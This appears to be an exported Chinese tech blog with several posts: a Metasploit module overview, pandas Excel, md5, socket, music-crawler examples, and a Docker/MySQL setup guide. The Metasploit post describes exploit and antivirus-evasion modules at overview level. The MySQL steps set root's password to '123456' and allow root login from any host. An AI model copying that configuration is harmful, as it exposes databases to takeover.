<p><img src="/aposts/40ebc0af/image-20220221153516843.png" alt="image-20220221153516843"></p>
<p>打开后，出现下面的提示信息，默认进入的其实就是<strong>msfconsole</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Starting database</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27; </span><br><span class="line">[+] Creating initial database schema</span><br><span class="line">...</span><br><span class="line">       =[ metasploit v6.1.14-dev                          ]</span><br><span class="line">+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: You can use help to view all </span><br><span class="line">available commands</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>其中Metasploit版本为v6.1.14-dev </p>
</li>
<li><p>模块种类及其个数：<strong>2180个exploits</strong>、1155个auxiliary、<strong>399个post</strong>、<strong>592个payloads</strong>、45个encoders、<strong>10个nops</strong>、9个evasion</p>
</li>
<li><p>Metasploit 用的<strong>是ruby开发的</strong>，以后自定义一些东西也要用ruby</p>
</li>
<li><p>Metasploit安装的文件路径如下</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">──(kali㉿kali)-[/usr/share/metasploit-framework/modules]</span><br><span class="line">└─$ pwd           </span><br><span class="line">/usr/share/metasploit-framework/modules</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[/usr/share/metasploit-framework/modules]</span><br><span class="line">└─$ ll</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 22 root root 4096 Dec 20 01:18 auxiliary</span><br><span class="line">drwxr-xr-x 12 root root 4096 Dec 20 01:18 encoders</span><br><span class="line">drwxr-xr-x  3 root root 4096 Dec 20 01:18 evasion</span><br><span class="line">drwxr-xr-x 22 root root 4096 Dec 20 01:18 exploits</span><br><span class="line">drwxr-xr-x 11 root root 4096 Dec 20 01:18 nops</span><br><span class="line">drwxr-xr-x  5 root root 4096 Dec 20 01:18 payloads</span><br><span class="line">drwxr-xr-x 14 root root 4096 Dec 20 01:18 post</span><br></pre></td></tr></table></figure>

<h2 id="msfconsole介绍"><a href="#msfconsole介绍" class="headerlink" title="msfconsole介绍"></a>msfconsole介绍</h2><ul>
<li>Msfcli在新版本已经不支持了，用msfconsole代替</li>
<li>它是访问Metasploit中大部分功能的唯一支持方式</li>
</ul>
<h3 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h3><ul>
<li><p><strong>漏洞渗透模块（exploits）</strong>：发现了目标的漏洞之后，在Metasploit找到相应的漏洞渗透模块，就可以对目标进行入侵</p>
</li>
<li><p><strong>攻击载荷模块（payload）</strong>：可以帮助我们在目标上完成远程控制操作。通常这些模块既可以单独执行，也可以和漏洞渗透模块一起执行（前面文章介绍过远程控制操作了）</p>
</li>
<li><p><strong>辅助模块（auxiliary）</strong>：进行信息收集的模块。例如一些信息侦查、网络扫描类的工具</p>
</li>
<li><p><strong>后渗透攻击模块（post）</strong>：当我们成功地取得目标的控制权之后，就是这些模块大显身手的时候，它可以帮助我们提高控制权限、手机敏感信息、实施调班攻击等</p>
</li>
<li><p><strong>编码器模块（encoders）</strong>：将攻击载荷进行编码（类似与加密），让避免操作系统和杀毒软件辨认出来但是会让载荷的体积变大，这个时候需要选择传输器和传输体配对成的攻击载荷来下载目标载荷并且运行。</p>
</li>
<li><p><strong>反杀毒软件木马模块（evasion）</strong>：这个模块可以轻松的创建反杀毒软件的木马</p>
</li>
</ul>
<h3 id="关键字help"><a href="#关键字help" class="headerlink" title="关键字help"></a>关键字help</h3><p>输入help可以查看Metasploit提供的命令和对应的描述。命令一共分为以下几类：</p>
<ul>
<li>核心命令：Core Commands</li>
<li>模块命令：Module Commands</li>
<li>任务命令：Job Commands</li>
<li>资源命令：Resourve Script Commands</li>
<li>数据库后台命令：Database Backend Commands</li>
<li>登录凭证后台命令：Credentials backend Commands</li>
<li>开发商命令：Developer Commands<br><img src="/aposts/40ebc0af/image-20220221161642849.png" alt="image-20220221161642849"></li>
</ul>
<h3 id="关键字Show"><a href="#关键字Show" class="headerlink" title="关键字Show"></a>关键字Show</h3><p>查看可以使用的模块：show 模块命</p>
<p><img src="/aposts/40ebc0af/image-20220221161947112.png" alt="image-20220221161947112"></p>
<h3 id="关键字search"><a href="#关键字search" class="headerlink" title="关键字search"></a>关键字search</h3><ul>
<li>Metasploit提供了大量的模块。当用户希望快速找到针对某漏洞模块时，则可以使用search命令进行搜索。搜索模块时，用户可以指定搜索类型、CVE ID、发布时间等，如search cve:2009 type:exploit。为了方便用户搜索模块，可以使用help search命令查看所有支持的过滤器。</li>
<li><a href="https://nvd.nist.gov/">CVE</a> ，全称为通用漏洞披露<ul>
<li>CVSS评分标准: 漏洞的最终得分最大为10，最小为0。得分<code>7~10</code>的漏洞通常被认为比较严重，得分在<code>4~6.9</code>之间的是中级漏洞，<code>0~3.9</code>的则是低级漏洞。</li>
</ul>
</li>
</ul>
<p><img src="/aposts/40ebc0af/image-20220221162210899.png" alt="image-20220221162210899"></p>
<p>更多命令的使用请参考<a href="https://www.fujieace.com/metasploit/msfconsole.html">这里</a></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>Metasploit</tag>
        <tag>kail</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-Excel-Pandas</title>
    <url>/aposts/2d5f3400/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">from ast import literal_eval</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class OperateExcel():</span><br><span class="line">    def __init__(self, file_path):</span><br><span class="line">        self.file_path = file_path</span><br><span class="line">        self.df = pd.read_excel(file_path, sheet_name=&quot;Sheet1&quot;)  # sheet_name不指定时默认返回全表数据</span><br><span class="line">        # self.df = pd.read_excel(file_path, sheet_name=&quot;Sheet1&quot;, usecols=[&#x27;name&#x27;, &#x27;method&#x27;])</span><br><span class="line"></span><br><span class="line">    def get_excel(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">         读取表格数据存为json</span><br><span class="line">        :return: </span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        data = []</span><br><span class="line">        for i in self.df.values:</span><br><span class="line">            params = &quot;&quot;</span><br><span class="line">            if i[3] == &quot;post&quot;:</span><br><span class="line">                params = literal_eval(i[4])</span><br><span class="line">            app = &#123;&quot;id&quot;: i[0], &quot;name&quot;: i[2], &quot;method&quot;: i[3], &quot;params&quot;: params&#125;</span><br><span class="line">            data.append(app)</span><br><span class="line">        print(data)</span><br><span class="line"></span><br><span class="line">    def write_excel(self):</span><br><span class="line">        # 根据条件累加数据</span><br><span class="line">        self.df[&#x27;id&#x27;][self.df[&#x27;name&#x27;] == &#x27;测试2&#x27;] += 100</span><br><span class="line">        print(self.df.head())</span><br><span class="line">        self.df.to_excel(&#x27;data3.xlsx&#x27;, sheet_name=&#x27;Sheet1&#x27;, index=False, header=True)</span><br><span class="line"></span><br><span class="line">        # 新增一行</span><br><span class="line">        self.df.loc[10] = [5, &#x27;Eric&#x27;, &#x27;male&#x27;, 20, &#x27;&#x27;]</span><br><span class="line"></span><br><span class="line">        # 新增一列</span><br><span class="line">        self.df[&#x27;favorite&#x27;] = None</span><br><span class="line"></span><br><span class="line">        self.df.to_excel(&#x27;data3.xlsx&#x27;, sheet_name=&#x27;Sheet1&#x27;, index=False, header=True)</span><br><span class="line">        print(self.df.head())</span><br><span class="line"></span><br><span class="line">    def get_filter_excel(self):</span><br><span class="line">        # 查看所有的值</span><br><span class="line">        print(self.df.values)</span><br><span class="line"></span><br><span class="line">        # 查看第一行的值</span><br><span class="line">        print(self.df.values[0])</span><br><span class="line"></span><br><span class="line">        # 查看某一列所有的值</span><br><span class="line">        print(self.df[&#x27;name&#x27;].values)</span><br><span class="line">        print(&quot;===打印头部数据，仅查看数据示例时常用====&quot;)</span><br><span class="line">        print(self.df.head())</span><br><span class="line">        print(&quot;====打印列标题===&quot;)</span><br><span class="line">        print(self.df.columns)</span><br><span class="line">        print(&quot;====打印行========&quot;)</span><br><span class="line">        print(self.df.index)</span><br><span class="line">        print(&quot;========打印指定列============&quot;)</span><br><span class="line">        print(self.df[&quot;name&quot;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    file_path = &#x27;data3.xlsx&#x27;</span><br><span class="line">    o_excel = OperateExcel(file_path)</span><br><span class="line">    o_excel.get_excel()</span><br><span class="line">    # o_excel.write_excel()</span><br><span class="line">    # o_excel.get_filter_excel()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>excel文件内容</li>
</ul>
<p><img src="/aposts/2d5f3400/1111.png" alt="image.png"></p>
<ul>
<li>其他几款操作excel对比，图片来源<a href="https://zhuanlan.zhihu.com/p/363810440">这里</a>：<br><img src="/aposts/2d5f3400/2222.png" alt="image.png"></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>Python3-X-md5</title>
    <url>/aposts/1ac23ba2/</url>
    <content><![CDATA[<p>python3.x已经把md5 module移除了。要想用md5得用hashlib module,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">m = hashlib.md5()  </span><br><span class="line">m.update(b&quot;Nobody inspects the spammish repetition&quot;) #参数必须是byte类型，否则报Unicode-objects must be encoded before hashing错误  </span><br><span class="line">md5value=m.hexdigest()  </span><br><span class="line">print(md5value)  #bb649c83dd1ea5c9d9dec9a18df0ffe9  </span><br></pre></td></tr></table></figure>
<p>其实可简写，如下面的md5的例子，hashlib.md5(data)，就可以了</p>
<p>但是对中文字符串md5怎么办？<br>中文字符在Python中是以unicode存在的,同一个字符串在不同的编码体系下有不同的值,所以在hash前要进行编码，个人建议转为gb2312,因为对比发现，我下载的一个工具算出的md5值是与gb2312编码后算出的md5值一样。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">data=&#x27;我是&#x27;  </span><br><span class="line">m = hashlib.md5(data.encode(encoding=&#x27;gb2312&#x27;))  </span><br><span class="line">print(m.hexdigest())  </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>Python与Java之间Socket通信</title>
    <url>/aposts/1715d38a/</url>
    <content><![CDATA[<ul>
<li>python socket server</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">    print(&quot;create socket succ!&quot;)</span><br><span class="line"></span><br><span class="line">    sock.bind((&#x27;192.168.1.38&#x27;,50006))</span><br><span class="line">    print(&#x27;bind socket succ!&#x27;)</span><br><span class="line"></span><br><span class="line">    sock.listen(5)</span><br><span class="line">    print(&#x27;listen succ!&#x27;)</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">    print(&quot;init socket error!&quot;)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    print(&quot;listen for client...&quot;)</span><br><span class="line">    conn,addr=sock.accept()</span><br><span class="line">    print(&quot;get client&quot;)</span><br><span class="line">    print(addr)</span><br><span class="line"></span><br><span class="line">    conn.settimeout(30)</span><br><span class="line">    szBuf=conn.recv(1024)</span><br><span class="line">    print(&quot;recv:&quot;+str(szBuf,&#x27;gbk&#x27;))</span><br><span class="line"></span><br><span class="line">    if &quot;0&quot;==szBuf:</span><br><span class="line">        conn.send(b&quot;exit&quot;)</span><br><span class="line">    else:</span><br><span class="line">        conn.send(b&quot;welcome client&quot;)</span><br><span class="line"></span><br><span class="line">    conn.close()</span><br><span class="line">    print(&quot;end of servive&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>python socket client</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">HOST = &#x27;192.168.1.38&#x27;</span><br><span class="line">PORT = 50006</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line">sock.send(&quot;232132132131&quot;.encode())</span><br><span class="line"></span><br><span class="line">szBuf = sock.recv(1024)</span><br><span class="line">byt = &#x27;recv:&#x27; + szBuf.decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(byt)</span><br><span class="line"></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>java socket client</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import java.net.Socket;</span><br><span class="line">import java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class SocketClient &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[])throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Socket socket = new Socket(&quot;192.168.1.38&quot;,50006);</span><br><span class="line"></span><br><span class="line">            //获取输出流，向服务器端发送信息</span><br><span class="line">            OutputStream os=socket.getOutputStream();//字节输出流</span><br><span class="line">            PrintWriter pw=new PrintWriter(os);//将输出流包装为打印流</span><br><span class="line">            pw.write(&quot;我是Java服务器&quot;);</span><br><span class="line">            pw.flush();</span><br><span class="line">            socket.shutdownOutput();//关闭输出流</span><br><span class="line"></span><br><span class="line">            InputStream is=socket.getInputStream();</span><br><span class="line">            BufferedReader in = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">            String info=null;</span><br><span class="line">            while((info=in.readLine())!=null)&#123;</span><br><span class="line">                System.out.println(&quot;我是客户端，Python服务器说：&quot;+info);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            in.close();</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; catch (UnknownHostException e) &#123;</span><br><span class="line">            // TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>值得注意的是，这里的服务器域名应该写本电脑上的ip,而不是127.0.0.1</li>
</ul>
<p>来自: <a href="http://blog.csdn.net/ChenTianSaber/article/details/52274257?locationNum=4">http://blog.csdn.net/ChenTianSaber/article/details/52274257?locationNum=4</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>Python多线程，单线程，协程爬虫某音乐实战对比</title>
    <url>/aposts/57ceda08/</url>
    <content><![CDATA[<ul>
<li>单线程，多线程下载某云音乐</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import urllib.request</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">from Threads import BaseThread</span><br><span class="line"></span><br><span class="line">PATH = lambda p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">https://music.163.com/playlist?id=  得到播放列表</span><br><span class="line">http://music.163.com/song/media/outer/url?id= 得到下载链接</span><br><span class="line">urllib.request.urlretrieve  把远程下载的mp3文件下载到本地</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Music163:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">    def get_music_163(self, id):</span><br><span class="line">        user_agent = &#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 &#x27; \</span><br><span class="line">                     &#x27;Safari/537.36 &#x27;</span><br><span class="line">        headers = &#123;&#x27;User-Agent&#x27;: user_agent&#125;</span><br><span class="line">        data = requests.get(&quot;https://music.163.com/playlist?id=&quot; + id, headers).text</span><br><span class="line">        soup = BeautifulSoup(data, &#x27;lxml&#x27;)</span><br><span class="line">        temp = []</span><br><span class="line">        for i in soup.find(&quot;ul&quot;, &#123;&quot;class&quot;, &quot;f-hide&quot;&#125;).find_all(&quot;a&quot;):</span><br><span class="line">            pattern = re.compile(&#x27;&lt;a .*?id=(.*?)&quot;&gt;(.*?)&lt;/a&gt;&#x27;, re.S)</span><br><span class="line">            items = re.findall(pattern, str(i))</span><br><span class="line">            temp.append([items[0][0], items[0][1]])</span><br><span class="line">        return temp</span><br><span class="line"></span><br><span class="line">    # 批量下载</span><br><span class="line">    def download(self, value):</span><br><span class="line">        for i in value:</span><br><span class="line">            if os.path.isfile(PATH(&quot;mp3/&quot; + i[1] + &quot;.mp3&quot;)):</span><br><span class="line">                print(&quot;%s已经被下载了&quot; % i[1])</span><br><span class="line">            else:</span><br><span class="line">                url = &#x27;http://music.163.com/song/media/outer/url?id=&#x27; + i[0] + &#x27;.mp3&#x27;</span><br><span class="line">                urllib.request.urlretrieve(url, &#x27;%s&#x27; % PATH(&quot;mp3/&quot; + i[1] + &quot;.mp3&quot;))</span><br><span class="line">                print(&quot;%s下载成功&quot; % i[1])</span><br><span class="line"></span><br><span class="line">    # 单个下载</span><br><span class="line">    def get(self, value):</span><br><span class="line">        if os.path.isfile(PATH(&quot;mp3/&quot; + value[1] + &quot;.mp3&quot;)):</span><br><span class="line">            print(&quot;%s已经被下载了&quot; % value[1])</span><br><span class="line">        else:</span><br><span class="line">            url = &#x27;http://music.163.com/song/media/outer/url?id=&#x27; + value[0] + &#x27;.mp3&#x27;</span><br><span class="line">            urllib.request.urlretrieve(url, &#x27;%s&#x27; % PATH(&quot;mp3/&quot; + value[1] + &quot;.mp3&quot;))</span><br><span class="line">            print(&quot;%s下载成功&quot; % value[1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 多线程</span><br><span class="line">def multi_thread():</span><br><span class="line">    id = &quot;2786226719&quot;  # 播放的列表id</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line">    mc = Music163()</span><br><span class="line">    data = mc.get_music_163(id)</span><br><span class="line">    count = len(data)</span><br><span class="line">    for i in range(0, count):</span><br><span class="line">        threads.append(BaseThread(mc.get(data[i])))</span><br><span class="line">    for j in range(0, count):</span><br><span class="line">        threads[j].start()</span><br><span class="line">    for k in range(0, count):</span><br><span class="line">        threads[k].join()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(&quot;共耗时%.2f&quot; % (end_time - start_time) + &quot;秒&quot;)</span><br><span class="line">    # 多线程47秒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 运行单线程</span><br><span class="line">def run():</span><br><span class="line">    id = &quot;2786226719&quot;  # 播放的列表id</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    mc = Music163()</span><br><span class="line">    data = mc.get_music_163(id)</span><br><span class="line">    mc.download(data)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(&quot;共耗时%.2f&quot; % (end_time - start_time) + &quot;秒&quot;)</span><br><span class="line">    # 单线程43秒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # run()</span><br><span class="line">    multi_thread()</span><br></pre></td></tr></table></figure>
<ul>
<li>单线程共下载100首歌,耗时9.09秒</li>
</ul>
<p><img src="/aposts/57ceda08/music1.png" alt="dan.png"></p>
<ul>
<li>多线程共下载100首歌,耗时9.60秒</li>
</ul>
<p><img src="/aposts/57ceda08/music2.png" alt="image.png"></p>
<ul>
<li>协程下载的代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mport time</span><br><span class="line">from multiprocessing import Process</span><br><span class="line">from gevent import monkey</span><br><span class="line">import urllib.request</span><br><span class="line">import BaseMusic163</span><br><span class="line">monkey.patch_all()</span><br><span class="line">import gevent</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">PATH = lambda p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">协程发请求,</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">class Producer(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self._rungevent()</span><br><span class="line"></span><br><span class="line">    def _rungevent(self):</span><br><span class="line">        jobs = []</span><br><span class="line">        id = &quot;2786226719&quot;  # 播放的列表id</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        mc = BaseMusic163.Music163()</span><br><span class="line">        data = mc.get_music_163(id)</span><br><span class="line">        count = len(data)</span><br><span class="line">        for i in range(count):  # windows下有1024端口限制</span><br><span class="line">            jobs.append(gevent.spawn(self.produce(data[i])))</span><br><span class="line">        gevent.joinall(jobs)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(&quot;共耗时%.2f&quot; % (end_time - start_time) + &quot;秒&quot;)</span><br><span class="line"></span><br><span class="line">    def produce(self, value):</span><br><span class="line">        if os.path.isfile(PATH(&quot;mp3/&quot; + value[1] + &quot;.mp3&quot;)):</span><br><span class="line">            print(&quot;%s已经被下载了&quot; % value[1])</span><br><span class="line">        else:</span><br><span class="line">            url = &#x27;http://music.163.com/song/media/outer/url?id=&#x27; + value[0] + &#x27;.mp3&#x27;</span><br><span class="line">            urllib.request.urlretrieve(url, &#x27;%s&#x27; % PATH(&quot;mp3/&quot; + value[1] + &quot;.mp3&quot;))</span><br><span class="line">            print(&quot;%s下载成功&quot; % value[1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p1 = Process(target=Producer, args=())</span><br><span class="line">    p1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<ul>
<li>下载时间<br><img src="/aposts/57ceda08/result.png" alt="image.png"></li>
</ul>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul>
<li>昨天测试，发现是协程&gt;多线程&gt;单线程</li>
<li>今天测试却是：多线程&gt;协程&gt;单线程</li>
<li>当然也会出现单线程耗时反而比多线程耗时短的情况</li>
<li>一直流传多进程+协程，可以解决python的GIL问题，因为本次测试的数据不多，使用的也是单进程+协程的方式，后续对协程的测试，有机会进行大量数据的测试，采用多进程+协程的方式进行测试</li>
<li><a href="https://github.com/Louis-me/PyCrawler">源码获取</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Sonic云真机测试平台使用指南</title>
    <url>/aposts/f586e041/</url>
    <content><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>本次主要记录win10_X64下搭建Sonic的使用步骤</p>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><ul>
<li>安装过程中出现很多问题，因为我的系统为家庭版本，所以需要安装<code>wsl2</code>，<code>Ubuntu 18.04.5 LTS</code>等，重装系统了为专业版本，直接就可以安装</li>
</ul>
<p><img src="/aposts/f586e041/image-20220823170502758.png" alt="image-20220823170502758"></p>
<ul>
<li><p>打开<a href="https://docs.docker.com/desktop/install/windows-install/">官网</a>下载并安装，重启电脑，进入到bios，打开虚拟化</p>
</li>
<li><p>打开Docker Desktop，正常启动后，打开cmd，输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;docker run -d -p 80:80 docker/getting-started</span><br><span class="line">Unable to find image &#x27;docker/getting-started:latest&#x27; locally</span><br><span class="line">latest: Pulling from docker/getting-started</span><br><span class="line">....</span><br><span class="line">dsha256:b558be874169471bd4e65bd6eac8c303b271a7ee8553ba47481b73b2bf597aae</span><br><span class="line">Status: Downloaded newer image for docker/getting-started:latest</span><br><span class="line">8df47bc4fdb1ec2ac47a70f609e8e73dc6afb62298c570b27b1ae9032fdd036d</span><br></pre></td></tr></table></figure>

<p>进入 docker 里可以看到测试运行的容器。</p>
<p><img src="/aposts/f586e041/image-20220823170833149.png" alt="image-20220823170833149"></p>
</li>
</ul>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>打开<a href="https://downloads.mysql.com/archives/community/">官网</a>，下载8.0的版本</p>
<p><img src="/aposts/f586e041/image-20220823171802303.png" alt="image-20220823171802303"></p>
<ul>
<li><p>设置环境变量：<code>D:\app\mysql-8.0.13-winx64\bin</code></p>
</li>
<li><p>在mysql的安装目录新建my.ini</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line"># 字符集设置</span><br><span class="line">default-character-set=utf8</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">port=3306</span><br><span class="line">character_set_server=utf8</span><br><span class="line"># 设置安装目录</span><br><span class="line">basedir=D:\app\mysql-8.0.13-winx64</span><br><span class="line"># 设置数据存放位置</span><br><span class="line">datadir=D:\app\mysql-8.0.13-winx64\data</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <code>mysqld --initialize --console</code> 命令来重置密码。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;mysqld --initialize --console</span><br><span class="line">2022-08-23T09:26:32.002602Z 0 [System] [MY-013169] [Server] D:\app\mysql-8.0.13-generated for root@localhost: QCHDW*9OpYQX</span><br><span class="line">2022-08-23T09:26:37.215593Z 0 [System] [MY-013170] [Server] D:\app\mysql-8.0.13-winx64\bin\mysqld.exe (mysqld 8.0.13) initializing of server has completed</span><br></pre></td></tr></table></figure>

<ul>
<li>登录并修改root用户的密码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;mysqld -install</span><br><span class="line">Service successfully installed.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;net start mysql</span><br><span class="line">MySQL 服务正在启动 .</span><br><span class="line">MySQL 服务已经启动成功。</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;mysql -u root -p</span><br><span class="line"></span><br><span class="line">mysql&gt;  alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>退出重新登陆验证</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; exit;</span><br><span class="line">Bye</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;mysql -u root -p</span><br><span class="line">Enter password: ******</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to</span><br></pre></td></tr></table></figure>

<ul>
<li>修改可以支持远程用IP访问</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">mysql&gt; select host, user from user;</span><br><span class="line">+-----------+------------------+</span><br><span class="line">| host      | user             |</span><br><span class="line">+-----------+------------------+</span><br><span class="line">| localhost | mysql.infoschema |</span><br><span class="line">| localhost | mysql.session    |</span><br><span class="line">| localhost | mysql.sys        |</span><br><span class="line">| localhost | root             |</span><br><span class="line">+-----------+------------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br><span class="line"># 查看表格中 root 用户的 host，默认应该显示的 localhost，只支持本地访问，不允许远程访问</span><br><span class="line"></span><br><span class="line">mysql&gt; update user set host=&#x27;%&#x27; where user =&#x27;root&#x27;;</span><br><span class="line"># 说明： % 代表任意的客户端,可替换成具体IP地址。</span><br><span class="line"></span><br><span class="line">Query OK, 1 row affected (0.08 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/f586e041/image-20220823175019789.png" alt="image-20220823175019789"></p>
<h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><ul>
<li><p>在<code>d:\sonic</code> 目录中下载<a href="https://sonic-cloud.gitee.io/#/Deploy">官网</a>的最新的部署包，我下载的为sonic-server-v1.5.0-beta，根据实际情况修改env的内容，主要是 ip，数据库的密码</p>
</li>
<li><p>手动建立数据库:<code>sonic</code></p>
</li>
<li><p>执行docker-compose</p>
</li>
</ul>
